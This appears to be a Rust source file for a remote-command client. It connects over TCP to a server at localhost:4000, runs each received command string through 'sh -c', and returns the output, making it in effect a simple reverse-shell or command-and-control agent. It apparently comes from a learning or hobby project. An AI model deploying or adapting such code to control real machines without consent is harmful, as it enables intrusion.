use std::{io, process};
use std::io::{BufReader, BufWriter, Read, Write};
use std::net::TcpStream;
use shared::Framer;
use shared::packet::{Command, Response};
use shared::protocol::LengthDelineated;

/// The main handler for the client
pub struct Client<R: Read, W: Write> {
    protocol: LengthDelineated<R, W>
}

impl<R: Read, W: Write> Client<R, W> {
    /// Create a new Client from a stream
    pub fn new(read: R, write: W) -> Self {
        let protocol = LengthDelineated::new(read, write);
        Self {
            protocol
        }
    }

    /// Run the client. Will block until the connection is closed.
    pub fn run(&mut self) {
        loop {
            log::debug!("Waiting for command");
            let command = match self.protocol.receive_message::<Command>() {
                Ok(Ok(n)) => n,
                Ok(Err(e)) => {
                    log::error!("Could not deserialize message: {e}");
                    continue;
                }
                Err(e) => {
                    log::info!("Connection closed: {:?}", e);
                    break;
                }
            };
            
            log::debug!("Received command {:?}", command);
            let response = self.handle_command(&command);
            if let Err(e) = self.protocol.send_message(&response) {
                log::error!("Error sending message to server: {:?}", e);
            }
        }
    }

    fn handle_command(&self, command: &Command) -> Response {
        match command {
            Command::RunCommand(command) => {
                let output = process::Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .output();

                match output {
                    Ok(output) => {
                        if output.status.success() {
                            Response::RunCommandOutput(
                                String::from_utf8_lossy(&output.stdout).to_string(),
                            )
                        } else {
                            Response::Error(output.status.code().unwrap_or(-1))
                        }
                    }
                    Err(_) => Response::Error(-1),
                }

            }
            Command::ConsolePrint(text) => {
                println!("{}", text);
                Response::Success
            }
        }
    }
}

const ADDRESS: &str = "localhost:4000";

fn main() -> io::Result<()> {
    pretty_env_logger::init();
    
    let stream = TcpStream::connect(ADDRESS)?;

    let read = BufReader::new(stream.try_clone().unwrap());
    let write = BufWriter::new(stream);

    let mut client = Client::new(read, write);
    client.run();

    Ok(())
}
